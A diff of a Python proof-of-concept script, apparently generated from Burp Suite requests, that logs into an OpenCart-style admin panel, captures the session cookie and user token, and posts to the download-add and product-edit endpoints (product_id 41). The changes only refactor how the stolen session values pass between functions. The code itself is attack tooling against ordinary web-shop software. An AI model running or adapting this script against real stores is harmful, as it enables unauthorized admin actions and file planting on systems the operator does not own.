@@ -32,14 +32,12 @@ def loginad():
      
    #print(cookies)
    #print(token)
-   return {
-    'cookies': cookies,
-    'token': token
-     }
+   return cookies, token
+     
 
 
 
-def addfile():
+def addfile(adcookies,adtoken):
     burp0_url = "https://"+host+":443//admin/index.php?route=catalog/download/add&user_token="+adtoken
     burp0_cookies = {"OCSESSID": adcookies, "language": "en-gb", "currency": "USD"}
     burp0_headers = {"Connection": "close", "Cache-Control": "max-age=0", "Origin": "https://"+host, "Upgrade-Insecure-Requests": "1", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryJ0kpr6vfuOQJuvkE", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36", "Sec-Fetch-Dest": "document", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Referer": "https://"+host+"/admin/index.php?route=catalog/download/add&user_token="+adtoken, "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9"}
@@ -50,7 +48,7 @@ def addfile():
     print(r.text)
    
    
-def setfile():
+def setfile(adcookies,adtoken):
     burp0_url = "https://"+host+":443//admin/index.php?route=catalog/product/edit&user_token="+adtoken+"&product_id=41"
     burp0_cookies = {"OCSESSID": adcookies, "__atuvc": "1%7C12", "currency": "EUR", "language": "en-gb"}
     burp0_headers = {"Referer": "https://"+host+"/admin/index.php?route=catalog/product/edit&user_token="+adtoken+"&product_id=41", "Cache-Control": "max-age=0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Content-Type": "multipart/form-data; boundary=---------------------------7e420b271064c", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
@@ -76,11 +74,11 @@ def setdownload():
 
 if __name__ == "__main__":
     n=loginad()
-    adcookies=n['cookies']
-    adtoken=n['token']
+    adcookies=n[0]
+    adtoken=n[1]
     print(adcookies)
     print(adtoken)   
-    addfile()
+    addfile(adcookies,adtoken)
     # n1=setfile()
     # n2=setdownload()
     # print("poc run ")
